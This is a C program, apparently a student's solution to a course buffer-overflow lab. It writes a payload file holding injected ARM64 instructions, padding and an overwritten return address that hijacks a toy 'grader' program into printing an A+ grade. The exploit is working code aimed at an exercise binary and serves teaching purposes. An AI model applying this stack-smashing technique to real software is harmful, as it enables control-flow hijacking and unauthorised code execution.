/*--------------------------------------------------------------------*/
/* createdataAplus.c                                                  */
/* Produces a file called dataAplus with the student name, nullbyte,  */
/* machine instructions to change grade to '+', set x30 to the printf */
/* instruction directly after grade = 'B' in grader, branch to printf */
/* with argument "A\0", padding to fill remainder of the stack,       */
/* except for the last two bytes of the stack, which get values 'A'   */
/* and '\0', then the address of the first instruction in BSS, which  */
/* will overwrite getName's stored x30.                               */
/*--------------------------------------------------------------------*/

#include <stdio.h>
#include <string.h>
#include "miniassembler.h"

/* Accepts no inputs. Creates a file called dataAplus and writes data to
   that file that will lead to an A+ attack. Returns 0. */
int main() {
    size_t ulIndex; /* index for the loop */
    FILE *psFile; /* file */
    unsigned long ulAddrInMain = 0x40089c; /* address of grade printf */
    unsigned long ulAddrInBSS = 0x42005c; /* address of code in BSS */
    unsigned long ulAddrOfAdr = 0x420060; /* address of 1st adr instr */
    unsigned long ulAddrOfB = 0x420070; /* address of b instr */
    unsigned long ulAddrOfGrade = 0x420044; /* address of grade */
    unsigned long ulAddrOfPrintF = 0x400690; /* addr of printf code */
    unsigned long ulAddrOfString = 0x420086; /* addr of "A\0" */
    unsigned int uiInstr; /* stores each instruction getting added */
    
    /* create and open file dataB */
    psFile = fopen("dataAplus", "w");

    /* put names into file */
    fprintf(psFile, "%c", 'N');
    fprintf(psFile, "%c", '&');
    fprintf(psFile, "%c", 'T');
    fprintf(psFile, "%c", '\0'); /* terminating null byte */

    /* put mov instruction */
    uiInstr = MiniAssembler_mov(0, '+');
    fwrite(&uiInstr, sizeof(unsigned int), 1, psFile);

    /* put first adr instruction */
    uiInstr = MiniAssembler_adr(1, ulAddrOfGrade, ulAddrOfAdr);
    fwrite(&uiInstr, sizeof(unsigned int), 1, psFile);

    /* put strb instruction */
    uiInstr = MiniAssembler_strb(0, 1);
    fwrite(&uiInstr, sizeof(unsigned int), 1, psFile);

    /* put second adr instruction */
    ulAddrOfAdr = 0x420068; /* current address */
    uiInstr = MiniAssembler_adr(0, ulAddrOfString, ulAddrOfAdr);
    fwrite(&uiInstr, sizeof(unsigned int), 1, psFile);

    /* put third adr instruction */
    ulAddrOfAdr = ulAddrOfAdr + 4; /* current address */
    uiInstr = MiniAssembler_adr(30, ulAddrInMain, ulAddrOfAdr);
    fwrite(&uiInstr, sizeof(unsigned int), 1, psFile);

    /* put b instruction */
    uiInstr = MiniAssembler_b(ulAddrOfPrintF, ulAddrOfB);
    fwrite(&uiInstr, sizeof(unsigned int), 1, psFile);

    /* fill remaining buffer except for string */
    for (ulIndex = 0; ulIndex < (48 - 28 - 2); ulIndex++) {
        fprintf(psFile, "%c", '\0');
    }

    /* store string "A\0" */
    fprintf(psFile, "%c", 'A');
    fprintf(psFile, "%c", '\0');

    /* change x30 */
    fwrite(&ulAddrInBSS, sizeof(ulAddrInBSS), 1, psFile);
    return 0;
}
